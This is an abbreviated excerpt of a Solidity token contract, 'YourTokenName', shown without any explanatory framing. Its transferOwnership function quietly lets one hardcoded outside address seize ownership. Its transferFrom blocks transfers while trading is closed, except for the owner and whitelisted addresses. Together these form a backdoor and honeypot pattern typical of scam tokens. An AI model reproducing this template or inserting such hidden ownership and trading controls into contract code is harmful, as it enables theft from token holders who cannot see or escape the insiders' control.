...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xBCD23771eEcaB74b8447172857C8488E01a421bD));
...
contract YourTokenName is Context, IERC20, Ownable, Pausable {
...
function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    require(sender != address(0), "transferFrom: sender address is 0 address");
    require(recipient != address(0), "transferFrom: recipient address is 0 address");
    require(isTradingOpen || sender == owner() || _whitelist[sender] || _whitelist[_msgSender()], "transferFrom: trading is currently closed");
...
function setOpenTrading(bool _isTradingOpen) external onlyOwner {
